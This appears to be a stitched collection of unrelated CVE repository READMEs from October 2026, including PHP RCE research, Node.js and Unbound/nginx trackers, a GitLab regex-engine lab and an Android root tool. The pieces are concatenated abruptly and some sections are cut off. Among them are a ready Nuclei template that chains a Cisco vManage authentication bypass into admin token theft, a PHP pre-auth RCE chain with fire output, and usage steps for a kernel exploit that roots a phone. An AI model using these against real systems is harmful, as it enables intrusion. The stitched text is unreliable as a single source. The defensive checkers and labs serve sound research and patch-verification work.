**Enterprise Defense-in-Depth, Official Vendor Mitigation Alignment, and Vulnerability Auditor for CVE-2026-109618 & CVE-2026-109619 (CVSS 9.2 Critical Pre-Auth RCE, CVSS v4.0)**

## Executive Summary

On October 21-22, 2026, security researchers and the PHP security team disclosed two critical pre-authentication Remote Code Execution (RCE) flaws affecting PHP versions from 5.4.0 (March 2012) through unpatched PHP 8.2, 8.3, 8.4, and 8.5:

* **CVE-2026-109618:** Out-Of-Memory (OOM) non-local bailout corruption in `_zend_hash_str_add_or_update_i`, leading to uninitialized pointer dereference during request teardown in Apache `mod_php`.
* **CVE-2026-109619:** State-publication inversion in `php_session_rfc1867_callback()`, causing request heap pointers to survive in persistent `PHP-FPM` workers, enabling multi-request temporal Use-After-Free (UAF) and arbitrary memory write via destructor slot signed underflow.

> **CRITICAL REMEDIATION MANDATE:**
> **Applying official upstream patches is the ONLY complete and permanent resolution.**
> Upstream fixed releases: **PHP 8.5.12**, **8.4.27**, **8.3.36**, and **8.2.35**.
> Active exploitation in the wild was detected within minutes of public disclosure. System administrators must upgrade immediately.
>
> For enterprise platforms where immediate binary replacement requires scheduled maintenance or qualification testing, official cybersecurity agencies (including **CSIRT Italia / ACN Alert AL07/261021/CSIRT-ITA**, **CISA**, and the **PHP Foundation**) have published temporary mitigation baselines. This repository provides drop-in implementations of these official baselines alongside high-concurrency operational calibration.

# php2shell lab — PHP CVE-2026-109618 / CVE-2026-109619

Lab reproduction and vulnerability-research package for the PHP 8.5.11
php2shell class (CVE-2026-109618, CVE-2026-109619), October 2026.
**Status: Proven — self-contained RCE** (four plain HTTP requests, no
debugger, no local access), plus amplification, patch-gap, and FPM
stale-state findings below.

**Contents:** [Results](#results-at-a-glance) · [Chains](#chains) ·
[Amplification](#52x-memory-amplification) · [Patch gaps](#patch-gaps-on-8.5.12) ·
[FPM stale state](#fpm-stale-bgunserialize) · [WAF bypass](#waf-signature-bypass) ·
[Environment](#exact-environment) · [Quick start](#quick-start) ·
[Proof discipline](#proof-discipline) · [Layout](#repository-layout) ·
[Public context](#public-context) · [Statement](#disclosure-statement)

## Results at a glance

| # | Finding | Classification |
|---|---|---|
| 1 | End-to-end self-contained RCE on PHP 8.5.11 — four plain HTTP requests, in-band address sourcing via `PS(id)`→cookie disclosure, both bases from one 512-byte PHPSESSID leak; 12/12 fires, uid=33, 8 ASLR generations | **Proven — self-contained RCE** |
| 2 | 52x memory amplification via duplicate 6-byte multipart headers — defeats `post_max_size` (2.57 MB body OOMs a 128M limit) on PHP 7.4–8.5.11 | **Proven — lab, all four versions** |
| 3 | Three exploit paths survive the 8.5.12 security patch (var_destroy re-entry UAF at n=1015, serialize-handler mismatch, upload-progress injection) | **Proven — ASAN on GPG-verified 8.5.12** |
| 4 | FPM stale `BG(unserialize)`: worker survives a session-decode OOM, stale state is consumed by the next request's rfc1867 window, heap-shaped consumption SIGSEGVs the worker | **Proven — mechanism + DoS; RCE unproven** |
| 5 | `Content-Type` separator bypass (`multipart/form-data, boundary=X`) — every published Content-Type-anchored WAF signature is bypassable | **Proven — SAPI.c parser behavior** |
| 6 | Both CVE chains dead on patched 8.5.12 (token-identical configure, GPG-verified source) | **Proven — negative control** |
| 7 | The public "cached-zval `session.upload_progress`" theory — refuted on 4 stock PHP versions + 3 LiteSpeed vendor builds, all cleanup/concurrency corners | **Refuted — exhaustive** |

## Chains

Two independent memory-corruption chains reach attacker-controlled indirect
calls on the stock `php:8.5.11-apache` image; the end-to-end wrapper combines
Chain B's mechanism with a novel in-band disclosure for a fully remote fire.

| | Chain A — stale bucket | Chain B — dangling reference |
|---|---|---|
| Mechanism | OOM bailout leaves a HashTable bucket published but uninitialized; shutdown consumes it as a fake zval → fake array → `pDestructor` | Pre-RINIT OOM leaves `PS(http_session_vars)` holding a dangling `zend_reference`; a live 31-byte string reclaims it; forged reference → `zend_hash_destroy` `pDestructor` |
| Allocator | tracked/system (`USE_ZEND_ALLOC=0`) | stock default Zend MM |
| Terminal | libc `system()` (gdb-calibrated addresses) | `zif_system` @ libphp+0x5996e0 (no libc) |
| Debugger at fire time | calibration only | **none — `FIRE_GDB=0`** |
| Reproducibility | 2 randomized parent generations | repeated, incl. cross-run |

### End-to-end receipt (12/12 fires, 8 ASLR generations, no debugger, no local access)

Leak-A arms a dangling `PS(id)` (1001st variable trips `max_input_vars` →
`headers_sent=1`; the empty-cookie `reset_id` failure keeps `send_cookie=1`;
a 24 MiB field OOMs pre-RINIT). Leak-B lands a 257-element array whose
`zend_array` overlaps `PS(id)−0x10`: `ZSTR_LEN` reads `nTableSize`=512 and the
URL-encoded cookie carries `pDestructor` (→ libphp base) plus nine `arData`
heap pointers (majority vote → chunk base). The measured chunk−libphp delta
is *not* constant across generations (−0x1a00000 / +0x3600000 / −0x1c00000),
so the disclosure is genuinely load-bearing. The fire then runs with the
leaked addresses. Prerequisites: `display_errors=On`, `post_max_size` above
the OOM field, `memory_limit` below it, single-worker prefork.

```text
A status='HTTP/1.1 200 OK'   → OOM fatal, worker survives, PS(id) armed
B Set-Cookie: PHPSESSID=<512-byte encoded disclosure>
FIRE → MARKER=uid=33(www-data) gid=33(www-data) groups=33(www-data)
FIRE_OK   (×12 across 8 distinct ASLR layouts)
```

Full receipt and control ladder: `docs/END-TO-END.md`.

# nodejs-CVE-2026-111497

A read-only Bash script that checks a Linux server for Node.js affected by the **Node.js security release of 2026-10-21**: CVE-2026-111497 (Brotli decoder out-of-bounds write, possible RCE), TLS hostname bypasses, a `dns.resolve` NUL truncation and 7 more, plus the eMudhra CA distrust.

It answers the question a version scan of your repositories cannot: **which Node version is each process on this server actually running right now**, including inside containers, and which processes still need a restart after an upgrade.

Output is in Vietnamese. Status labels are translated in [Reading the output](#reading-the-output).

Advisory: https://nodejs.org/en/blog/vulnerability/october-2026-security-releases

| Branch | Fixed in |
|---|---|
| 22 | 22.23.4 |
| 24 | 24.22.1 |
| 26 | 26.12.1 |
| 20 and older, 21, 23, 25 | end-of-life, no fix: move to a supported branch (24 recommended) |

## Quick start

```bash
# On the server
curl -fsSLO https://raw.githubusercontent.com/duytien241/nodejs-CVE-2026-111497/main/check-nodejs-server.sh
less check-nodejs-server.sh          # read it before running it with sudo
sudo bash check-nodejs-server.sh

# Or from your machine, without copying the file to the server
ssh user@host 'sudo bash -s' < check-nodejs-server.sh
```

For a repeatable audit, download a specific commit instead of `main` (replace `main` in the URL with a commit SHA) and check its SHA-256.

## What it checks

1. **Installs**: every Node on the host: `PATH`, distro package, nvm, fnm, volta, asdf, n, nodenv, snap, VS Code / Cursor Server, and any directory passed with `--search`. The version is read from `include/node/node_version.h` or package metadata first; `node --version` is only a fallback, run as the file's owner.
2. **Running processes**: for every node process:
   - the real version of the binary it is running;
   - whether it runs on the host or in a container, and which container (Docker name, or Kubernetes `namespace/pod/container`);
   - its role (Next.js SSR, Nuxt SSR, NestJS, pm2, npm/yarn);
   - its listening ports, read inside the container's network namespace;
   - whether it still runs a binary that was replaced on disk (`CẦN RESTART`).
3. **Distro backports**: Debian and RPM changelogs that list these CVEs, so a patched distro package with an old version number is not reported as vulnerable.
4. **CA bundles**: eMudhra / emSign certificates in files referenced by `NODE_EXTRA_CA_CERTS` (process environment, `/etc/environment`, systemd units), and processes that use the OS CA store.
5. **`--containers`**: `node --version` inside every running container that was not already seen as a node process, for example a PHP image that ships Node for asset builds. Works with Docker or `crictl`.

## Usage

```bash
sudo ./check-nodejs-server.sh                    # installs + running processes + CA
sudo ./check-nodejs-server.sh --containers       # also exec into running containers
sudo ./check-nodejs-server.sh --search /srv      # look for app-bundled node binaries
sudo ./check-nodejs-server.sh --json > "$(hostname).json"
./check-nodejs-server.sh --classify v20.11.1     # classify one version string
CRI=crictl sudo -E ./check-nodejs-server.sh --containers   # Kubernetes node (containerd)
./check-nodejs-server.sh -h
```

| `--search DIR` | Also look for `node` / `nodejs` binaries under `DIR` (repeatable, max depth 8, one filesystem). |
| `--json` | Machine-readable output, see [JSON output](#json-output). |

---
id: CVE-2026-76504

info:
  name: Cisco vManage - Auth Bypass (CVE-2026-76504)
  author: your-name
  severity: critical
  description: |
    Authentication bypass in Cisco Catalyst SD-WAN Manager (vManage) via improper
    URI encoding handling. A request to /%6a_security_check bypasses the front-end
    security filter and returns a valid JSESSIONID, which can be used to obtain an
    admin API token.
  reference:
    - https://your-poc-reference
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2026-76504
    cwe-id: CWE-177

http:
  - raw:
      # Step 1: The bypass request to get a session cookie
      - |
        POST /%6a_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username=poc&j_password=poc

      # Step 2: Use the session cookie to pull the API token
      - |
        GET /dataservice/client/token HTTP/1.1
        Host: {{Hostname}}

    # The magic: keep the JSESSIONID from step 1 for step 2
    cookie-reuse: true

    # Matchers to confirm the bypass succeeded
    matchers-condition: and
    matchers:
      # The token endpoint should return a JSON string (the token)
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "FBA1D58F" # Example token prefix, or just check for a long hex string
        condition: or
      # Stronger check: verify the body is a 128-char hex string (typical token format)
      - type: regex
        part: body
        regex:
          - "^[A-F0-9]{128}$"

    # Optional: extract the token for reporting
    extractors:
      - type: regex
        name: api_token
        part: body
        regex:
          - "^[A-F0-9]{128}$"

---

| Log file | What to look for |
|---|---|

Additional red flags:

- `200` responses with an **empty body** on a login endpoint
- `/dataservice/client/token` calls from sessions younger than ~1 second
- `tenantbackup/export` jobs initiated by unusual accounts

# CVE-2026-97206 Tracking — Claude Code Context

This repository contains a living tracking document for the five
Unbound vulnerabilities fixed by **Unbound 1.26.2**, released
2026-10-21. The tracker is named after **CVE-2026-97206**, the highest
scored of the five: a use-after-free when a remote DNS-over-QUIC (DoQ)
client triggers a QUIC path migration on a multi-threaded resolver,
which frees a DoQ stream a pending mesh reply still points to. The
five, as NLnet Labs' [security advisories][advisories] state them:

| CVE | Title (short) | Vulnerable | CVSS 3.1 (NLnet Labs as CNA) |
|---|---|---|---|
| CVE-2026-97206 | DoQ path-migration use-after-free | 1.22.0–1.26.1 | 7.5 |
| CVE-2026-50106 | Insecure NXDOMAIN under an island trust anchor | ≤ 1.26.1 | 6.5 |
| CVE-2026-96405 | Aggregate decompression work, degradation of service | ≤ 1.26.1 | 5.3 |
| CVE-2026-109125 | Cache side channel via `unwanted-reply-threshold` | ≤ 1.26.1 | 5.3 |
| CVE-2026-35501 | Island trust anchor bypass via attacker NSEC | 1.0.1–1.26.1 | 3.7 |

All five are fixed in **1.26.2**, with per-CVE patches against 1.26.1
published alongside. NLnet Labs is both upstream and CNA, so the
advisory texts (`https://nlnetlabs.nl/downloads/unbound/<CVE>.txt`)
are the source for ranges and impact, and the CVE records for scores.

State impact as the sources state it: CVE-2026-97206 is a crash
(denial of service only, `A:H`), not code execution; the two
trust-island bugs make a configured island insecure; CVE-2026-96405
is degradation of service; CVE-2026-109125 is a cache-poisoning path
that the advisory itself calls "not feasible on default
configurations". Don't claim a public exploit or in-the-wild use
until a source does.

Each bug needs something beyond the version — a DoQ-capable build
serving DoQ with several threads (97206), an island trust anchor
below an insecure parent (50106, 35501), a non-zero
`unwanted-reply-threshold` (109125); only 96405 reaches every
resolver. None of the tracked distributions' default packages is
built with DoQ: Debian and pkgsrc never, nixpkgs only in
`unbound-full`.

The rendered site is published at <https://kimmo.cloud/CVE-2026-97206/>.

This is a package tracker, seeded from the template's `skeleton/` plus
`package/` overlay. Its layout follows the nginx tracker
<https://kimmo.cloud/CVE-2026-97205/> (`~/src/CVE-2026-97205`): one
*Patch status* table with an upstream row and live *Current version*,
a verdict keyed on every CVE whose range covers the row's version.
The previous Unbound tracker, <https://kimmo.cloud/CVE-2026-81642/>
(`~/src/CVE-2026-81642`, the 1.26.1 release), is linked as *Related*
and predates that layout; its recipes are the Unbound-specific source
for the ones below.

[advisories]: https://nlnetlabs.nl/projects/unbound/security-advisories/

# CVE-2026-97205 Tracking — Claude Code Context

This repository contains a living tracking document for the five nginx
core vulnerabilities fixed by **nginx 1.30.6** (stable) and **nginx
1.31.7** (mainline), both released 2026-10-14. The tracker is named
after **CVE-2026-97205**, the one NCSC-FI's advisory headlines: a
use-after-free in the worker process when asynchronous file I/O
(`aio on` / `aio threads`) serves a Server Side Includes page with
`include virtual` commands. The five, as nginx.org states them in its
[security advisories][advisories]:

| CVE | nginx.org title | Vulnerable | CVSS 3.1 / 4.0 (F5 as CNA) |
|---|---|---|---|
| CVE-2026-97205 | Use-after-free when using asynchronous file I/O (AIO) | 0.8.11–1.31.6 | 8.1 / 9.2 |
| CVE-2026-15176 | Buffer overflow when using alias with rewrite | 0.1.29–1.31.6 | 8.1 / 9.2 |
| CVE-2026-93479 | Buffer overflow in script evaluation | 1.31.2–1.31.6, 1.30.0–1.30.5 | 8.1 / 9.2 |
| CVE-2026-97629 | Session forgery when using TLS session tickets | 1.23.2–1.31.6 | 6.5 / 8.3 |
| CVE-2026-95101 | Request body injection in HTTP/3 | 1.25.0–1.31.6 | 5.3 / 6.9 |

All five are fixed in **1.31.7+ and 1.30.6+**; nginx.org rates every
one of them "medium". F5, the CNA, publishes the CVSS scores and its
own advisories (K000162608, K000162416, K000162607, K000162606,
K000162613). F5's portal is a JavaScript SPA that WebFetch cannot
read: link it, take version ranges from nginx.org, and scores from
the CVE Services API. F5's version tables list only the versions F5
still supports (e.g. CVE-2026-97205 from 1.30.0), so they are **not**
the vulnerable range — nginx.org's is.

State impact as the sources state it: a worker crash and restart, and
code execution only where ASLR is disabled or bypassed (the three 9.2
bugs); session forgery and a client-certificate verification bypass
(CVE-2026-97629); request-body injection into the proxied request and
a `client_max_body_size` bypass (CVE-2026-95101). CISA's SSVC on the
three critical-scored CVE records says exploitation `none`. Don't
claim a public exploit or in-the-wild use until a source does.

Also announced the same day, and covered in prose only — they never
flip a row:

- **njs** CVE-2026-101025 (memory exhaustion parsing malformed XML)
  and CVE-2026-101019 (inconsistent XML attribute values), njs
  0.7.10–1.0.1, fixed in **njs 1.0.2** ([njs advisories][njs]). njs is
  a separate module; a configuration without `js_import` is not
  exposed.
- **NGINX Ingress Controller** (CVE-2026-94197, CVE-2026-104939) and
  **NGINX Gateway Fabric** (CVE-2026-91184, CVE-2026-96615) — F5's
  Kubernetes products, out of scope.

The rendered site is published at <https://kimmo.cloud/CVE-2026-97205/>.

This is a package tracker, seeded from the template's `skeleton/` plus
`package/` overlay. Unlike the earlier nginx trackers (CVE-2026-9256,
CVE-2026-42533), it keeps **one** *Patch status* table for both nginx
tracks, with the fixed threshold varying by row (see *What flips a
verdict*).

[advisories]: https://nginx.org/en/security_advisories.html
[njs]: https://nginx.org/en/docs/njs/security.html

# CVE-2026-93834 Tracking — Claude Code Context

This repository contains a living tracking document for
**CVE-2026-93834**, a use-after-free in QEMU's 9pfs (virtio-9p /
VirtFS) host file server that lets a guest escape to the host.
`v9fs_co_open2()` (`hw/9pfs/cofile.c`, the `Tlcreate` handler) was the
only code that changed a fid's path from a worker thread — it freed
the old path and copied in the new one under the fid-path write lock —
while the main-thread readers (`v9fs_walk()`, `v9fs_xattrwalk()`,
`v9fs_stat()`, `v9fs_co_name_to_path()`) take no read lock. Racing
`Tlcreate` against `Twalk` lets a guest copy a freed or half-written
path, which `local_open_nofollow()` (`hw/9pfs/9p-local.c`) then
resolves outside the export: arbitrary host file read/write and code
execution as the QEMU process user. It needs a 9p share on the VM and
root (or 9p mount rights) in the guest; virtio-fs does not use this
code.

State the impact as the sources state it: the reporter demonstrated
the escape and describes the reproducer in the public upstream issue,
and CISA's SSVC says `poc`. Don't claim in-the-wild exploitation, and
don't claim that `security_model`, a read-only export, or any other
9p option prevents the escape — no source says so. Red Hat's
mitigation (no 9pfs/VirtFS, use virtio-fs) is the only one to repeat.

- **Fix:** QEMU master commit
  [`fe9e30899f`][fix] "hw/9pfs: mutate FID path from main thread only
  (CVE-2026-93834)" by Christian Schoenebeck, merged 2026-09-23

# CVE-2026-81642 Tracking — Claude Code Context

This repository contains a living tracking document for
**CVE-2026-81642**, a heap buffer overflow in Unbound's DNSSEC
validator: digesting a DNSKEY whose owner name is a compression pointer
into its own RDATA overruns the digest buffer with attacker-controlled
bytes, for denial of service and possible remote code execution. The
trigger is a lookup of an attacker-controlled zone by a validating
resolver. The tracker also covers the two other DNSSEC validator bugs
closed by the same release:

- **CVE-2026-81634** — heap buffer overflow in RRset canonicalisation
  (a 255-byte query name plus a large TCP response; the length check
  omitted the first owner name). Runs before signature verification,
  so a malicious nameserver or an on-path tamperer suffices. DoS only
  per the CNA score.
- **CVE-2026-85501** — the Unbound share of *ReTrap*, algorithmic
  complexity attacks on DNSSEC validation (TagTrap, DelegationTrap,
  NsecTrap, AdditionalTrap). Degradation of service.

All three are stated as the advisories state them; there is no
third-party research to weigh yet, and no public exploit. Don't
promote the RCE beyond "possible", which is the CNA's own word, and
don't downgrade it either.

- **Affected:** Unbound up to and including 1.26.0.
- **Fixed:** Unbound 1.26.1, released 2026-09-16, with per-CVE
  patches against 1.26.0 published alongside.
- **Severity (NLnet Labs as CNA):** CVE-2026-81642 CVSS 4.0 9.1
  (critical), CWE-122; CVE-2026-81634 CVSS 3.1 7.5 (high), CWE-122;
  CVE-2026-85501 CVSS 3.1 5.3 (medium), CWE-770. NVD has published
  no score of its own.
- **Upstream advisories:**
  <https://nlnetlabs.nl/downloads/unbound/CVE-2026-81642.txt>,
  <https://nlnetlabs.nl/downloads/unbound/CVE-2026-81634.txt>,
  <https://nlnetlabs.nl/downloads/unbound/CVE-2026-85501.txt>

# CVE-2026-108551 — openapi-typescript-codegen Code Injection

![CVSS 9.8 Critical](https://img.shields.io/badge/CVSS-9.8%20CRITICAL-red)

- **CVE:** CVE-2026-108551
- **CVSS v3.1:** 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **CVSS v4.0:** 9.3 Critical
- **CWE:** CWE-94 Code Injection
- **Vendor / product:** ferdikoomen / openapi-typescript-codegen (npm)
- **Affected:** `<= 0.31.0`
- **Fixed:** None. Latest release is 0.31.0; issue #2809 is still open (2026-10-23).
- **Patch status:** **Unpatched**
- **Public exploit:** None public. The reporter states a PoC is available on request. This repository includes a **non-weaponized, educational PoC** (benign marker file only) alongside the detection tooling.

## Summary

Spec-derived values (path keys, parameter names, `servers[0].url`, `info.version`,
media types, response header names) are interpolated into single-quoted string
literals in generated TypeScript without escaping. A single quote in an
attacker-controlled OpenAPI document can break out of the literal and inject
JavaScript that runs at **import time** (via `core/OpenAPI.ts`) or when a generated
service method is called.

The victim is the developer or CI pipeline that generates or runs a client from an
untrusted or attacker-influenced OpenAPI description. This is a supply-chain /
developer-tooling issue, not a remotely reachable server bug.

## Proof of concept (educational, non-weaponized)

`poc/` contains a self-contained demonstration of **import-time** execution. A
crafted `info.version` breaks out of the single-quoted literal in
`core/OpenAPI.ts` and runs JavaScript when the generated client is imported.
The payload is deliberately harmless: it writes `poc-executed.txt` and prints a
message. It makes no network calls and accesses no secrets.

```powershell
cd poc
powershell -ExecutionPolicy Bypass -File .\run-poc.ps1
```

Expected output includes:

```text
[CVE-2026-108551] payload executed: poc-executed.txt written
[+] PoC CONFIRMED: attacker-controlled spec code ran at import time.
```

See [`poc/README.md`](poc/README.md) for the mechanism, requirements, and safety
notes. Run it only in a disposable sandbox. The same injection class also affects
request paths, parameter names, media types, response header names, and
`servers[0].url`.

# CVE-2026-110264 — reproduction lab

**GitLab CE/EE, CVSS 10.0, unauthenticated RCE — root cause in Ruby's bundled regexp engine (Onigmo).**

A standalone, unprivileged lab that reproduces the *engine* bug behind GitLab's CVE-2026-110264,
with an A/B against the vendor's own fix. No GitLab install, no Ruby install, no container
runtime, no root: the engine is compiled from source and driven by a 70-line C harness.

```bash
./run.sh          # clones, builds 4 configurations, prints a verdict per step
cat RESULTS.txt   # frozen output of a full run
```

Measured, not quoted: every number in `RESULTS.txt` comes from executing the code in this
directory.

### ▶ Live visualiser — https://lesterlam.github.io/onigmo-cve-2026-110264/

A single self-contained page charting the measured level 1–3 results: the ID sawtooth and its wrap
point, the write-window map, the read oracle, the two negative results, and the exploitation ladder
with demonstrated / not-demonstrated tags. Source: [`docs/index.html`](docs/index.html).

It is an **illustration of measurements taken from this repo's logs — not a live vulnerable
service** (a browser cannot run the vulnerable engine, and the page says so on its face).

---

## Scope — what this lab does and does not show

| | |
|---|---|
| ✅ Demonstrates | The 16-bit internal-ID overflow in the regexp compiler, in the exact engine Ruby ships |
| ✅ Demonstrates | The index arithmetic: `id = -32768` → access `262144` bytes before the base pointer |
| ✅ Demonstrates | Real memory-safety failure: `SIGSEGV` unsanitised, ASAN write into a retired heap block |
| ✅ Demonstrates | The vuln-vs-patched behavioural delta on byte-identical input |
| ✅ Demonstrates | The complete upstream fix: 4 hunks, 3 files, +8 lines |
| ✅ Demonstrates | Trigger cost: 557,073 bytes of plain ASCII, no authentication, no headers |
| ❌ Does not show | Weaponised RCE on GitLab (heap grooming against a live GitLab worker is out of scope) |
| ❌ Does not show | Which GitLab route is reachable *unauthenticated* — GitLab's HackerOne report (4093475) is still restricted, and the tracking work item is not public until 90 days after the patch release |
| ❌ Does not show | The null-check arm driven to a memory fault — measured only as accept-vs-reject on our subject |
| ❌ Does not show | A patched *GitLab* instance; the A/B is at the engine layer, which is where the bug lives |

Isolation: loopback-free, no network target, no external hosts contacted after the source clone,
disposable `vendor/` and `build-*/` directories, nothing installed system-wide.

# 怎么用（iQOO Neo9 / PD2338 · OriginOS 6「橘子 6」特化版）

> 原作者（酷安）：<https://www.coolapk.com/U/43561117>
> 原文：《vivo iQOO Neo9 (PD2338) Root 研究》<https://www.coolapk.com/feed/74180094>
> GhostLock 原项目：[YuKongA/ghostlock-app](https://github.com/YuKongA/ghostlock-app)
>
> `ghostlock.bin` **只适用于** iQOO Neo9（PD2338）+ OriginOS 6 16.2.13.2 +
> 内核 `5.15.197-g708015331567-dirty`。换机型/固件请勿直接使用（会 panic）。
> 仅供自有设备学习研究，风险自担。

## 30 秒手机侧准备

1. **USB 数据线连电脑**（数据线，不是仅充电线），`adb devices` 能看到 `device`
2. 开发者选项 → **USB 调试**打开，弹窗勾"始终允许这台电脑"
3. 开发者选项 → **停止限制子进程**（后台进程限制设"标准"）
4. **去掉锁屏密码** + **去掉所有锁屏**
5. 开发者选项 → **默认 USB 配置 = 文件传输（MTP）**；建议屏幕常亮、关省电

不需要装 GhostLock App / Shizuku。

## 解压后有什么

```
ghostlock-pc-v1.2.1/
├── reroot.sh         主脚本（Linux/WSL）
├── reroot-mac.sh     主脚本（macOS 专用，只依赖系统自带工具）
├── install-ksu.sh    提权后：加载你自己的 .ko、装任意 KSU 管理器
├── clean.sh          清理 / 卸载（默认 dry-run）
├── ghostlock.bin     payload（libghostlock.so + vrpatch.ko + profile.bin）
├── README.md / QUICKSTART.md
└── SHA256SUMS.txt
```

> 包里**不含** KSU 管理器 APK 和 `.ko`：管理器装在手机上，`.ko` 由你自己提供
> （官方 LKM 资产或自己编），详见 README §五。

## 跑

```bash
chmod +x *.sh

./reroot.sh                          # 最多 10 轮：等开机窗口 → 发射 → 命中即停
./reroot.sh --check                  # 只看当前有没有 root（不发射）
./reroot.sh --inspect                # 看 payload 包里有什么
./reroot.sh --deploy                 # 只部署 payload，不打
./reroot.sh --ko 1 --clean-after     # 一条龙：列 ko → 选 → 提权 → 成功后清理 → 退出

# 还没装管理器？把上游 APK 放进来，一条命令装好再跑：
./reroot.sh --install-apk SukiSU_v4.2.1-r1_41049-release.apk --ko 1 --clean-after

# macOS 全程把 reroot.sh 换成 reroot-mac.sh
```

成功后：

```bash
adb shell su -c 'id'                 # uid=0(root) context=u:r:ksu:s0
```

## 之后

```bash
./install-ksu.sh                     # 提权后：列本目录的 ko / 管理器 apk
./install-ksu.sh --ko 1 --install 1  # 加载你的 ko + 装管理器
./clean.sh                           # 清理清单（--yes 才删）
./clean.sh --yes --all --reboot      # 全清 + 重启，回到干净系统
```

`late-load` 只在内存里，**重启就没了**，重启后重跑 `./reroot.sh` 即可。

细节见 `README.md`；实测数据与踩坑记录见 `docs/FIELD-NOTES.md`。

# One-tap temporary root for iQOO Neo9 (PC version)

**English** · [中文](README.md)

Takes the root app's job off the phone: drive the original native exploit from your PC over `adb`.
**Plug the phone in → run the script → get temporary root.**

- No bootloader unlock, no flashing, no system-partition writes (system stays erofs + dm-verity green)
- Root lives in memory only: **a reboot takes it away**; just run the script again
- Based on CVE-2026-43499 (GhostLock, a futex-PI race) — the exploit has to land in the first
  ~tens of seconds after boot

> **Supported device/build only** (the script checks `uname -r` and refuses anything else):
> vivo **iQOO Neo9 (PD2338)** · **OriginOS 6, build 16.2.13.2** · kernel **`5.15.197-g708015331567-dirty`**

## 1. Phone-side preparation (4 items)

1. Connect over USB, enable **USB debugging**
2. Developer options → turn **"Suspend execution for cached apps"** off (stop limiting child processes)
3. **Remove the lock-screen password / all lock screens**
4. Default USB configuration = **File transfer**

You need `adb`. Linux / WSL / macOS all work (on macOS use `reroot-mac.sh`; no coreutils needed).

```bash
unzip ghostlock-pc-iqoo-neo9-v1.2.1-linux.zip && cd ghostlock-pc-v1.2.1
chmod +x *.sh
./reroot.sh                 # macOS: ./reroot-mac.sh
```

[+] 成功：root 已在（KernelSU late-load）
  su      : uid=0(root) gid=0(root) context=u:r:ksu:s0
```

Then:

```bash
adb shell su -c 'id'
```

# Node.js CVE-2026-111497 Security Checker

A lightweight Python 3 security auditing tool for checking Node.js versions against the known affected and fixed version thresholds for **CVE-2026-111497**, a vulnerability involving the Brotli decoder.

## Overview

This tool provides three ways to assess potential exposure:

- **Version check:** Compares a supplied Node.js version against the configured fixed-version thresholds.
- **HTTP check:** Inspects a web server's HTTP response headers for technology information. This mode is informational and cannot confirm the installed Node.js version.
- **SSH check:** Connects to an authorized server over SSH and queries the Node.js version available in the remote shell's `PATH`.

The tool performs non-destructive checks. It does not send exploit payloads, attempt code execution, or modify the target system.

## Requirements

- Python 3.8 or newer
- Network access for HTTP checks
- An SSH client and authorized SSH access for remote version checks

No third-party Python packages are required.

## Usage

### 1. Check a specific Node.js version

```bash
python3 check_node_cve_2026_111497.py --version 22.14.0
```

This compares the supplied version against the configured threshold for its major release branch.

### 2. Inspect an HTTP server

```bash
python3 check_node_cve_2026_111497.py --url https://example.com
```

The tool sends an HTTP `HEAD` request and displays the response status and relevant headers, such as `Server` and `X-Powered-By`.

**Note:** HTTP headers alone cannot establish whether the application uses a vulnerable Node.js runtime.

### 3. Check a remote server over SSH

```bash
python3 check_node_cve_2026_111497.py --ssh user@server.example.com
```

The tool executes a Node.js version query through SSH. Configure SSH authentication before running this command.

The reported version belongs to the executable found in the remote shell's `PATH`. It may differ from the runtime used by a PM2 process, a systemd service, a container, or another application environment.

## Configured Version Thresholds

The script uses the following minimum fixed versions:

| Node.js branch | Minimum fixed version |
|---|---|
| 22.x | 22.23.4 |
| 24.x | 24.22.1 |
| 26.x | 26.12.1 |

These thresholds should be verified against the official Node.js security advisory before production use.

## Output and Exit Codes

| Exit code | Meaning |
|---|---|
| `0` | The supplied or detected version meets the configured fixed-version threshold. |
| `1` | The version is below the configured fixed-version threshold. |
| `2` | The result is inconclusive, the version is unsupported by the checker, or the check failed. |

A version-based result does not prove that a remote attack is possible or that the application is exploitable.

## Understanding the Results

### Vulnerable by version

The reported version is older than the configured fixed version for its branch. Upgrade Node.js to a supported release containing the security fix and restart the affected application processes.

### Fixed by version

The reported version meets the configured threshold. Confirm that the application actually runs this patched runtime and that no other affected Node.js installations are in use.

### Inconclusive

The available HTTP information or SSH result was insufficient to establish the runtime's status. Verify the installed version through an authorized administrative channel.

## Limitations

- The HTTP mode does not perform vulnerability exploitation or directly test the Brotli decoder.
- The SSH mode checks the runtime accessible through the remote shell's `PATH`; it may not match the application runtime.
- The version comparison is a screening mechanism, not a complete vulnerability assessment.
- A vulnerable runtime does not automatically mean that a remotely exploitable attack path exists.
- The script's version thresholds must be kept up to date with official security advisories.
- Unsupported release branches require separate verification against their maintenance and security status.

## Recommended Remediation

1. Identify the Node.js runtime used by the affected application.
2. Verify the applicable fixed version in the official Node.js security advisory.
3. Upgrade to a supported patched release.
4. Restart the application and verify the runtime version again.
5. Review whether untrusted Brotli-compressed data can reach the affected decoding functionality.

## Official References

- [Node.js Security Releases](https://nodejs.org/en/blog/vulnerability/)
- [Node.js Official Website](https://nodejs.org/)

## Disclaimer

This tool is intended for authorized security auditing and defensive maintenance. It provides version-based indicators and basic HTTP/SSH inspection, not a definitive exploitability assessment.

# chrome2shell — Chrome CVE research lab

> **This repository does NOT contain exploits or an RCE chain.** Despite the
> name, it is a crash-only reproduction lab and exploitability assessment:
> CVE inventory, patches, root cause and vulnerable-vs-patched differential.
> It contains no exploit code, no read/write primitives and no sandbox escapes.
>
> Intended use: defensive research and patch verification in owned, authorized
> environments.

A reproducible lab to study and **verify** critical Google Chrome CVEs using
only public information: official advisories, crbug.com bug IDs and the fix
commits.

> **Scope:** defensive, crash-only lab. It contains no exploits, no RCE and no
> sandbox evasion. The goal is to answer one question: *can the flaw be
> reproduced on the affected build and confirmed fixed on the patched one?*

---

## TL;DR — what we found

The last two stable releases (October 15 and 20, 2026) contain **7 CVEs rated
`Critical`** by the Chrome team:

| CVE | Component | Type | Bug ID | Fix commit | Reproducible |
|-----|-----------|------|--------|-----------|--------------|
| CVE-2026-110922 | Prerender | UAF (browser) | 568719351 | `d50992ebe4` | ⚠️ needs BFCache+SW |
| CVE-2026-113341 | Skia / Ganesh | UAF (driver) | 569165786 | `02b14267` (skia) | ❌ Imagination hardware |
